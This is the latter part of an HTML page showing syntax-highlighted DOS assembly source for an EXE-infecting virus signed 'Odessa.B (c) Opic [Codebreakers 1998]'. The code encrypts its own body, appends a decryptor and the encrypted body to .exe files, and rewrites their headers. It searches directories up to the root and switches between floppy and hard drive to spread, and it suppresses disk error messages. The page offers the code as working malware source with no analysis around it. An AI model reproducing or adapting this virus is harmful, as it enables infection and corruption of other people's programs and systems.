                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Begin_Virus</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;crypt virus</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Begin_Virus</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;write decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Begin_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;write encrypted portion</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Begin_Virus</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">   </span><span class="sc1">;SOF</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;write new header</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ni24h</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;ignore error</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">       </span><span class="sc1">;critical error handler</span><span class="sc0">
</span><span class="sc5">ni24h</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Search</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">      </span><span class="sc1">;critical error handler</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;saves orig</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">;stuffs to restore later</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">ni24h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">;ES was changed by 3524h but you need it</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">            </span><span class="sc1">;to be restored for the crypt procedure.</span><span class="sc0">

</span><span class="sc5">first</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0"> </span><span class="sc1">;find first</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filespec</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">findnext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">findover</span><span class="sc0">        </span><span class="sc1">;no? get out!</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">        </span><span class="sc1">;yes and infect!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0"> </span><span class="sc1">;find next</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">findnext</span><span class="sc0">
</span><span class="sc5">findover</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">         </span><span class="sc1">;change dirs</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dotdot</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;to root</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">            </span><span class="sc1">;now</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc0">          </span><span class="sc1">;find first file</span><span class="sc0">
              
</span><span class="sc5">get_cur_drive</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">         </span><span class="sc1">;what drive are we on?</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;if already floppy</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Search_Exit</span><span class="sc0">     </span><span class="sc1">;we can leave now.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">         </span><span class="sc1">;select default drive</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;this time the floppy drive</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc0">          </span><span class="sc1">;exe on floppy?</span><span class="sc0">
</span><span class="sc5">Search_Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Search</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Begin</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">  </span><span class="sc1">;get current dta</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">     </span><span class="sc1">;save it</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">     </span><span class="sc1">;restore es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">  </span><span class="sc1">;set new dta to end of virus</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">End_Virus</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">  </span><span class="sc1">;select default drive (main HDD)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">;c:\
                int 21h     ;so our virus can move from</span><span class="sc0">
                            </span><span class="sc1">;a floppy to a new HDD without</span><span class="sc0">
                            </span><span class="sc1">;any help</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_ip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_ip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check_Payload</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">           </span><span class="sc1">;back to c:\
                mov dl,02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">restore</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;restore prev location DTA</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">           </span><span class="sc1">;reset dta</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">            </span><span class="sc1">;es points to PSP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">                  </span><span class="sc1">;ints off!</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_ss</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_sp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">                  </span><span class="sc1">;ints on!</span><span class="sc0">
</span><span class="sc5">Begin</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">original_ip</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">original_cs</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">original_ss</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">original_sp</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">old_ip</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
</span><span class="sc5">old_cs</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old_ss</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old_sp</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0fffeh</span><span class="sc0">
</span><span class="sc5">filespec</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">dotdot</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sig</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Odessa.B (c) Opic [Codebreakers 1998]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   
</span><span class="sc5">header</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">End_Virus</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">42</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">

              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Entry</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">
</span><span class="sc5">Entry</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">     </span><span class="sc1">;&lt;- Begin procedure</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00H</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">     </span><span class="sc1">;&lt;- End procedure</span><span class="sc0">

</span><span class="sc5">Exe_Infector</span><span class="sc0">  </span><span class="sc9">Ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Entry</span><span class="sc0">













</span></div></body>
</html>
